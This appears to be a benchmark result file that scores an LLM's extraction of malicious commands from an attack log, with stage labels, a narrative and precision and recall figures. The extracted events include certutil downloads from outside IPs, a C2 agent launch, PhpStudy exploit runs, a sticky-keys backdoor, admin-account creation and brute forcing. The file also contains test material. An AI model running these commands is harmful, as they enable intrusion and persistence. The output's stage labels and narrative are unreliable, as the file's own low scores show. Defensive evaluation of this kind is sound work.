@@ -1,0 +1,216 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Collection"
+      },
+      {
+        "command": "/c python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\sethc.exe /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "nbtscan.exe 192.168.0.244/24",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "PAExec.exe \\192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "PAExec.exe \\192.168.0.244 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "net user nbb nb123. /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "wmic cpu get NumberOfLogicalProcessors",
+        "stage": "Discovery"
+      },
+      {
+        "command": "systeminfo|find \u064f\u0629\u06e9\u0651\u068e\u0631\u06cc\u064b",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "tasklist /svc | findstr TermService",
+        "stage": "Collection"
+      },
+      {
+        "command": "tasklist /svc | findstr TermService",
+        "stage": "Collection"
+      },
+      {
+        "command": "netstat -ano | findstr 88",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&netstat -ano | find \"88\"&echo [S]",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&netstat -ano | find \"88\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&netstat -ano | find \"88\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&wmic cpu get NumberOfLogicalProcessors&echo [S]",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&wmic cpu get NumberOfLogicalProcessors",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&wmic memorychip get capacity&echo [S]",
+        "stage": "Collection"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&wmic memorychip get capacity",
+        "stage": "Collection"
+      },
+      {
+        "command": "PAExec.exe \\192.168.0.244 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "tasklist /svc | findstr TermService",
+        "stage": "Collection"
+      },
+      {
+        "command": "winbrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "taskkill /f /im sethc.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg delete HKCU\\Software\\Microsoft\\Microsoft SQL Server\\Client State",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "openwith.exe -Embedding",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "winrm quickconfig",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wmic bios get version",
+        "stage": "Discovery"
+      },
+      {
+        "command": "winaudit.exe -all",
+        "stage": "Discovery"
+      },
+      {
+        "command": "systeminfo > d:/phpstudy/www/system_info.txt",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "This was an extensive multi-stage attack where the attackers initially gained multiple footholds using various tools such as certutil and PAExec.exe, exploited Remote Desktop vulnerabilities to obtain administrative privileges, established persistence on the system by deploying new payloads, evaded detection through clearing logs and manipulating registry settings, gathered sensitive information regarding system configuration and active connections, moved laterally throughout the network to compromise additional hosts, and finally collected detailed system specifications. The attackers also employed brute force attacks to gain access to privileged accounts and attempted to disable certain security features to further their goals.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 21934,
+      "completion_tokens": 4307,
+      "total_tokens": 26241,
+      "wall_clock_s": 51.416,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.1951219512195122,
+      "recall": 0.8888888888888888,
+      "f1": 0.32,
+      "tp": 8,
+      "fp": 33,
+      "fn": 1
+    },
+    "stage": {
+      "precision": 0.07317073170731707,
+      "recall": 0.42857142857142855,
+      "f1": 0.125,
+      "tp": 3,
+      "fp": 38,
+      "fn": 4,
+      "recall_partial": 0.5833333333333334
+    },
+    "hallucination_rate": 0.19047619047619047,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 21934,
+      "completion_tokens": 4307,
+      "total_tokens": 26241,
+      "wall_clock_s": 51.416,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
